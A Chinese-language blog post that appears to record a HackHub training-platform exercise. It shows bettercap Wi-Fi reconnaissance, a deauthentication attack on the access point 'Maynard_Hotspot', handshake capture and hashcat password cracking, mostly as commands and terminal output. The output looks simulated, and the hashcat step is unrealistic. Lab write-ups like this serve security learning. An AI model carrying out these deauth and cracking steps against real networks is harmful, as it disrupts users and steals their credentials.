---
title: HackHub 實戰紀錄 - Wi-Fi 網路安全測試與密碼破解
published: 2026-06-06
description: "以下為搭配實際操作指令與終端機輸出畫面，詳細梳理的網路安全測試與密碼破解流程。這是一次使用 HackHub 平台學習的實戰紀實。"
cover: "./hackhub-practical-record.jpg"
coverInContent: false
tags:
  - Wi-Fi
  - bettercap
  - hashcat
  - 滲透測試
  - 資訊安全
category: HackHub
draft: false
---

## 1. 安裝網路分析工具與初始化環境

首先安裝 `bettercap`，進入該工具後，開啟本機網路探測功能，並檢查目前的網路介面狀態，確認 `wlan0` 網卡有支援監聽模式（<mark>Monitoring: true</mark>）。

**操作指令與輸出內容：**

```text
$ apt-get install bettercap
Reading package lists... Done
Building dependency tree
Reading state information... Done
Installing package...
[##############################] %100.00
The following NEW packages will be installed: bettercap

$ bettercap
BetterCap > 127.0.0.1 » net.probe on
[12:36:33] [sys.log] net.probe probing on 127.0.0.1/24

BetterCap > 127.0.0.1 » net.show
+-----------+-----------+---------------------------------------------+------------+
| Interface | Chipset   | Driver                                      | Monitoring |
+-----------+-----------+---------------------------------------------+------------+
| <mark>wlan0</mark>     | ath9k_htc | Atheros Communications, Inc. AR9271 802.11n | <mark>true</mark>       |
| wlan1     | vap9      | madwifi-ng VAP                              | false      |
+-----------+-----------+---------------------------------------------+------------+
```

## 2. 掃描無線網路與鎖定目標

接著，指定使用 `wlan0` 網卡啟動 Wi-Fi 偵測模組，列出周遭環境的無線存取點（AP）。在確認列表後，將目標鎖定為 SSID 為 `Maynard_Hotspot` 的設備。

**操作指令與輸出內容：**

```text
BetterCap > 127.0.0.1 » wifi.recon wlan0
[12:43:18] [sys.log] wifi.recon is currently running on wlan0 chipset.

BetterCap > 127.0.0.1 » wifi.show
(顯示包含 <mark>Maynard_Hotspot</mark> 在內的多個 AP 資訊，此處省略部分列表)
| -30 dBm | a3:0b:49:3e:85:ee | <mark>Maynard_Hotspot</mark>  | WPA2 (CCMP, PSK) | 0   | 94e806a |

BetterCap > 127.0.0.1 » set wifi.ap a3:0b:49:3e:85:ee
[12:44:15] [sys.log] Target AP set to a3:0b:49:3e:85:ee (SSID: <mark>Maynard_Hotspot</mark>)
```

## 3. 發動解除認證攻擊並擷取交握封包

鎖定目標後，發動 <mark>解除認證攻擊（Deauthentication Attack）</mark>，這會切斷目標設備上現有客戶端的連線。當客戶端嘗試重新連線時，系統成功擷取到了 <mark>WPA 交握封包（Handshake）</mark> 並儲存下來。

**操作指令與輸出內容：**

```text
BetterCap > 127.0.0.1 » wifi.deauth
[12:44:35] [sys.log] Processing...
[12:44:37] [sys.log] Sending deauthentication packets to a3:0b:49:3e:85:ee ...
(重複發送封包...)
[12:44:45] [sys.log] Process completed, capturing handshake ...
[12:44:46] [sys.log] Handshake captured: /root/maynard_hotspot.pcap

BetterCap > 127.0.0.1 » exit
```

## 4. 安裝破解工具與進行離線密碼破解

退出 bettercap 後，安裝了密碼破解工具 `hashcat`。在確認擷取到的封包檔（`maynard_hotspot.pcap`）存在於當前目錄後，直接使用 hashcat 對該檔案進行破解，並成功得出了 <mark>Wi-Fi 密碼</mark>。

**操作指令與輸出內容：**

```text
$ apt-get install hashcat
(安裝過程省略)

$ ls
etc	lib	logs
home	<mark>maynard_hotspot.pcap</mark>

$ hashcat maynard_hotspot.pcap
Session..........: hashcat
Status...........: Running
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Guess.Queue......: 1/1 (100.00%)
Time.Started.....: 2026/6/6 下午12:46:29
Time.Estimated...: 2026/6/6 下午12:51:29
Speed.#1.........: 102.3 kH/s (5.21ms) @ Accel:64 Loops:32 Thr:256 Vec:1

Recovered.......: 1/1 (100.00%) Digests
Password.......: "<mark>fovpBn0D7usDKl2</mark>"
```
